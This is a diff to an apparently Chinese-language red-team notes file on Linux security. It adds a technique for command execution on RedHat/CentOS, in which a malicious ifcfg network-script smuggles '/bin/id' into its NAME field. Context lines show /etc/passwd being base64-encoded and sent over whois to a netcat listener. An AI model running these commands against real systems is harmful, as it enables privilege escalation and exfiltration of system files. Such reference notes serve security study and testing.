@@ -306,6 +306,24 @@ nc -vlnp 1337 | sed "s/ //g" | base64 -d
 whois -h 127.0.0.1 -p 1337 `cat /etc/passwd | base64`
 ```
 
+### network-scripts
+
+> 来自文章 : https://seclists.org/fulldisclosure/2019/Apr/24
+
+Redhat/CentOS 发行版下通过写恶意网卡配置文件进行命令执行
+```bash
+sudo tee /etc/sysconfig/network-scripts/ifcfg-1337 <<-'EOF'
+NAME=Network /bin/id  &lt;= Note the blank space
+ONBOOT=yes
+DEVICE=eth0
+EOF
+
+service network restart             # 重启网络管理触发
+systemctl status network.service    # 可以看到 id 已经执行
+```
+
+![](../../../../assets/img/Security/RedTeam/OS安全/Linux安全/4.png)
+
 ---
 
 # 认证
